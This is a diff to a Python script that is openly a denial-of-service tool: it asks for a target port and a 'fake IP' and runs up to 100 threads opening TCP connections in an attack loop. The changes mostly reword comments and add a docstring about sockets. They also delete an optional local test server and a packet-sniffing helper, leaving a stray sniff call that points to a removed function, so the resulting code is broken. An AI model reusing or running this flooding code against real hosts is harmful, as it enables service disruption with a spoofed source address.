@@ -5,7 +5,7 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 from threading import Event
 
-# Setup logging
+# logging
 logging.basicConfig(level=logging.INFO)
 
 # Parameters
@@ -14,10 +14,14 @@ port = int(input("Enter target port: "))  # Parameterized target port
 fk_ip = input("Enter fake IP: ")  # Parameterized fake IP
 max_threads = 100  # Maximum threads for thread pool
 
-# Graceful stop event
+# stop event by ctrl+c
 stop_event = Event()
 
 # Function for handling each attack connection
+""" 
+     This is main function in which connection is made through socket.
+     socket.AF_INET tell to make connection through internet and socket.SOCK_STREAM tell that we use TCP protocol 
+"""
 def attack():
     while not stop_event.is_set():
         try:
@@ -59,28 +63,12 @@ try:
     start_attack()
 
 except KeyboardInterrupt:
-    # Graceful shutdown on Ctrl+C
+    # shutdown on Ctrl+C
     stop_threads()
-    logging.info("Attack stopped gracefully.")
+    logging.info("Attack stopped .")
 
-# Optional: Simple HTTP server to simulate a server under attack (for testing)
-def start_simple_server():
-    from http.server import SimpleHTTPRequestHandler, HTTPServer
 
-    server = HTTPServer(('localhost', 8080), SimpleHTTPRequestHandler)
-    logging.info("Simple HTTP server started at http://localhost:8080")
-    server.serve_forever()
 
-# Optional: Packet analysis using scapy (for educational purposes)
-def packet_analysis():
-    from scapy.all import sniff
-
-    def packet_callback(packet):
-        logging.info(f"Packet captured: {packet.summary()}")
 
     sniff(prn=packet_callback, count=10)  # Capture 10 packets for analysis
-
-# Uncomment below to test server or packet analysis:
-# start_simple_server()
-# packet_analysis()
 
